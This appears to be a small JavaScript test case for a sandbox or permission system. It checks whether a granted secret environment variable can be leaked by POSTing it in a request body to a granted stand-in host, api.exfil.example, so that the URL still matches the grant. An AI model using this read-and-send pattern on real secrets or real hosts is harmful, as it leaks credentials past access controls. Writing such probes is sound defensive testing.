// Category: exfiltration using ONLY already-granted resources.
// DEMO_SECRET is an explicitly granted (read) environment variable and
// api.exfil.example is an explicitly granted network host. The secret is
// smuggled in the request BODY so the URL stays a literal that matches the
// grant. If any real network bridge exists, this leaks the secret.
const secret = process.env.DEMO_SECRET;
fetch("https://api.exfil.example/beacon", {
  method: "POST",
  body: "leak=" + secret,
}).then(
  (r) => console.log("B06 sent, status:", r.status),
  (e) => console.log("B06 transport refused:", String(e).slice(0, 90))
);
